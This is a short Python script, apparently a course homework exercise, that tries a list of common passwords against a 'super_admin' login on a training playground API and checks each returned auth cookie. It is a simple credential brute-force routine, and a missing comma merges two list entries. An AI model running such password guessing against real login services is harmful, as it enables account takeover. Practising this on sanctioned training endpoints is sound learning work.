import json
import requests

url1 = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

login = "super_admin"
passwords = {"123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123" \
             "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", \
             "welcome", "888888", "princess", "dragon", "password1", "123qwe"}

for item in passwords:
    data = {"login":login, "password":item}
    response = requests.post(url1, data=data)
    auth_cookie = {'auth_cookie': response.cookies['auth_cookie']}
    print(auth_cookie)

    response = requests.post(url2, data=auth_cookie)
    print(response.text)